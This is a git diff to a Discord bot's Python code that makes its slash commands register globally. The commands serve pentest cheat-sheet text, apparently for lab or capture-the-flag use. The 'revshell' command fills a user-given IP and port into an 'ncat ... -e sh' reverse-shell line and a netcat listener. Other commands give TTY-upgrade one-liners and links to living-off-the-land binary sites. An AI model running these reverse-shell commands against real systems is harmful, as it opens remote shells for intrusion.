@@ -18,11 +18,11 @@ client = discord.Client(intents=intents)
 tree = discord.app_commands.CommandTree(client=client)
 servers = [discord.Object(id=1160247666870075422), discord.Object(id=923420517560627272)]
 
-@tree.command(name="ping", description="Gives latency between you and the bot", guilds=servers)
+@tree.command(name="ping", description="Gives latency between you and the bot")
 async def ping(interaction):
     await interaction.response.send_message(f'Pong: {round(client.latency, 3)}ms', ephemeral=True)
 
-@tree.command(name="revshell", description="Get a reverse shell", guilds=servers)
+@tree.command(name="revshell", description="Get a reverse shell")
 async def revshell(interaction, ip_address: str, port: int):
     await interaction.response.send_message(f"""
                                             Don't forget ```bash\nnc -lnvp {port}\n```
@@ -32,7 +32,7 @@ async def revshell(interaction, ip_address: str, port: int):
                                             ```bash\nncat {ip_address} {port} -e sh```
                                             """.replace("    ", ""), ephemeral=True)
 
-@tree.command(name="tty", description="Get a TTY Shell", guilds=servers)
+@tree.command(name="tty", description="Get a TTY Shell")
 async def tty(interaction):
     await interaction.response.send_message(f"""
                                             ```bash\npython -c 'import pty; pty.spawn("/bin/sh")'```
@@ -40,18 +40,18 @@ async def tty(interaction):
                                             ```bash\n/bin/sh -i```
                                             """.replace("    ", ""), ephemeral=True)
 
-@tree.command(name="lolbins", description="Get websites for Living Off the Land (LOL) binaries", guilds=servers)
+@tree.command(name="lolbins", description="Get websites for Living Off the Land (LOL) binaries")
 async def lolbins(interaction):
     await interaction.response.send_message(f"""
                                             Windows: https://lolbas-project.github.io/
                                             Linux: https://gtfobins.github.io/
                                             """.replace("    ", ""), ephemeral=True)
 
-@tree.command(name="github", description="DinoBot Github", guilds=servers)
+@tree.command(name="github", description="DinoBot Github")
 async def github(interaction):
     await interaction.response.send_message("https://github.com/Daniel-Tomov/DinoBot", ephemeral=True)
 
-@tree.command(name="uptime", description="Uptime of Dinobot", guilds=servers)
+@tree.command(name="uptime", description="Uptime of Dinobot")
 async def uptime(interaction):
     global startTime
     await interaction.response.send_message(str(datetime.timedelta(seconds=int(round(time.time()-startTime)))), ephemeral=True)
@@ -60,8 +60,6 @@ async def uptime(interaction):
 @client.event
 async def on_ready():
     client.loop.create_task(presense())
-    for server in servers:
-        await tree.sync(guild=server)
 
     global startTime
     startTime = time.time()
@@ -103,7 +101,5 @@ async def presense():
         status = random.choice(presense_states)
         await client.change_presence( activity=status )
         await asyncio.sleep(3600)
-
-
 
 client.run(token=TOKEN)
